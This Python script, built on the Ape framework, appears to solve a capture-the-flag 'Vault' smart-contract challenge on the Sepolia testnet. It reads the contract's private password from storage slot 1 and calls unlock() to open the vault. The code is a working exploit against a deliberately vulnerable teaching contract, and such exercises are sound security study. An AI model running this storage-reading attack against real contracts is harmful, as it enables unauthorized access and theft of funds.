#!/usr/bin/python3
from ape import accounts, networks, project
from rich.console import Console

# sepolia: 0xDd735E989ecDA243C32ed18fEb8115D8adF88b78
ADDRESS = "0xDd735E989ecDA243C32ed18fEb8115D8adF88b78"

console = Console()


def attack():
    attacker = accounts[0]
    attacker.set_autosign(True)
    target_contract = project.Vault.at(ADDRESS)

    console.print(f"[green]Vault Status: [magenta]{target_contract.locked()}")
    console.print("[red]Attacking Now...")

    password = networks.provider.get_storage_at(target_contract.address, 1)

    target_contract.unlock(password, sender=attacker)

    console.print(f"[green]Vault Status: [magenta]{target_contract.locked()}")

    assert target_contract.locked() is False


def main():
    attack()


if __name__ == "__main__":
    main()
